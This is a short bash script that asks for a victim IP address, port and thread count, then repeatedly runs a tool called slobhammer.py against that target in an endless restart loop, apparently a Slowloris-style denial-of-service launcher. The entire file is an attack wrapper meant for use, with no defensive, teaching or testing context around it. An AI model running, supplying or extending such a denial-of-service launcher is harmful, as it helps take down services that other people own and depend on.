echo "Enter Victim IP: "
read IP
echo "Enter Victim Port: "
read port
echo "Enter Amount of Threads: "
read threads
gnome-terminal --tab -e "./slobloop2.sh"
while [ true ]; do
     ./slobhammer.py -T -t $IP -p $port -r $threads
     echo ""
     echo ""
     echo ""
     echo "KILLED"
     echo ""
     echo ""
     echo "Restarting..."
     echo ""
     echo ""
     sleep 1
done
